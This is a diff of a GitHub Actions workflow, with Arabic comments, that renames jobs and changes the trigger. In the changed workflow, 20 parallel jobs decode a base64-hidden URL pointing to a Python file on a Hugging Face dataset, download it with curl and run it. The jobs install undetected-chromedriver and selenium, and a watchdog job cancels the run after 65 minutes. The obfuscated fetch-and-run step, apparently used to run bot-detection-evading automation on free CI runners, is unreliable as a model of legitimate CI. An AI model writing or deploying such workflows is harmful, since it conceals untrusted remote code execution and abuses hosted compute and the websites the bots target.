@@ -1,12 +1,11 @@
-name: Linux Coordinated Task Expedition
+name: Linux Cohesive Task Assembly
 
 on:
-  # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
-  repository_dispatch:
-    types: [start]
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
 
 concurrency:
-  group: coordinated-expedition-${{ github.workflow }}-${{ github.ref }}
+  group: cohesive-assembly-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,22 +14,22 @@ permissions:
 
 jobs:
   # =================================================================
-  # مدير الإنهاء المطلق: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # ناظر الإبادة الكاملة: يُنهي الـ workflow بأكمله عند حد 65 دقيقة
   # =================================================================
-  absolute-shutdown-manager:
-    name: "Absolute Shutdown Manager"
+  annihilation-overseer:
+    name: "Annihilation Overseer"
     runs-on: ubuntu-latest
     timeout-minutes: 70
     steps:
-      - name: Dispatch Complete Blackout Directive
+      - name: Trigger Total Annihilation Sequence
         run: |
-          echo "[MANAGER] Absolute shutdown manager seated. Total blackout enforced at the 65-minute checkpoint."
-          echo "[MANAGER] Tracking workflow reference: ${{ github.run_id }}"
+          echo "[OVERSEER] Annihilation overseer on post. Total eradication armed at the 65-minute boundary."
+          echo "[OVERSEER] Reading workflow stamp: ${{ github.run_id }}"
           
           # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
           sleep 3900
           
-          echo "[MANAGER] Checkpoint cleared! Dispatching complete blackout directive..."
+          echo "[OVERSEER] Boundary crossed! Triggering total annihilation sequence..."
           
           # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
           curl -sS -X POST \
@@ -39,70 +38,70 @@ jobs:
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
           
-          echo "[MANAGER] Blackout directive dispatched. All operating and waiting units will be neutralized."
+          echo "[OVERSEER] Annihilation sequence triggered. All running and scheduled units will be eradicated."
 
   # =================================================================
-  # المهمة الرئيسية: تجهيز وإطلاق وحدات الحملة
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات التجمع
   # =================================================================
-  launch-expedition:
-    name: "ExpeditionUnit-${{ matrix.unit_seal }}"
+  convene-assembly:
+    name: "AssemblyUnit-${{ matrix.unit_serial }}"
     runs-on: ubuntu-latest
     timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        unit_seal: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_serial: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
-      # ┃الخطوة ١┃ تهيئة البيئة القاعدية
-      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
-      - name: Prepare Base Environment
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # ⟢ المقطع الأول: إعداد القاعدة الأولية
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Configure Primary Foundation
         run: |
-          echo "[PREPARE] Preparing base environment for ExpeditionUnit-${{ matrix.unit_seal }} on Linux..."
+          echo "[PRIMARY] Configuring primary foundation for AssemblyUnit-${{ matrix.unit_serial }} on Linux..."
           sudo apt update -qq
           sudo apt install -y curl python3-pip
 
-      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
-      # ┃الخطوة ٢┃ استدعاء ملف المهمة الرئيسي
-      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
-      - name: Fetch Primary Mission File
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # ⟢ المقطع الثاني: انتزاع الملف التنفيذي
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Extract Execution File
         run: |
-          echo "[FETCH] Fetching app_task.py from assigned relay station..."
-          RELAY_STATION=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$RELAY_STATION" -o app_task.py
-          echo "[FETCH] Primary mission file retrieved."
+          echo "[EXTRACT] Extracting app_task.py from assigned source vault..."
+          SOURCE_VAULT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$SOURCE_VAULT" -o app_task.py
+          echo "[EXTRACT] Execution file extracted successfully."
 
-      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
-      # ┃الخطوة ٣┃ تجهيز المكتبات البرمجية
-      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
-      - name: Set Up Software Libraries
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # ⟢ المقطع الثالث: تجميع الحزم الأساسية
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Aggregate Essential Packages
         run: |
-          echo "[SETUP] Setting up software libraries..."
+          echo "[AGGREGATE] Aggregating essential packages..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
-      # ┃الخطوة ٤┃ التشغيل تحت رقابة زمنية (65 دقيقة)
-      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
-      - name: Conduct Timed Operation
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # ⟢ المقطع الرابع: التنفيذ المُقيَّد بالمدة (65 دقيقة)
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Perform Duration-Locked Run
         run: |
-          echo ">> Initiating ExpeditionUnit-${{ matrix.unit_seal }} operation..."
+          echo ">> Convening AssemblyUnit-${{ matrix.unit_serial }} operation..."
           
           # إطلاق العملية في الخلفية
           python3 app_task.py &
-          EXPEDITION_PID=$!
+          ASSEMBLY_PID=$!
           
-          echo ">> Timed controller watching. Hard cap: 65 minutes (3900s)."
+          echo ">> Duration lock engaged. Span: 65 minutes (3900s)."
           
           # الانتظار حتى استنفاد المدة المحددة
           sleep 3900
           
           # التحقق من حالة العملية وإنهاؤها عند الضرورة
-          if kill -0 $EXPEDITION_PID 2>/dev/null; then
-            echo ">> Hard cap surpassed! Retiring operation..."
-            kill -9 $EXPEDITION_PID
-            echo ">> Operation retired by controller."
+          if kill -0 $ASSEMBLY_PID 2>/dev/null; then
+            echo ">> Duration lock expired! Retiring operation..."
+            kill -9 $ASSEMBLY_PID
+            echo ">> Operation retired by lock enforcer."
           else
-            echo ">> Operation concluded within the hard cap."
+            echo ">> Operation closed within duration lock."
           fi
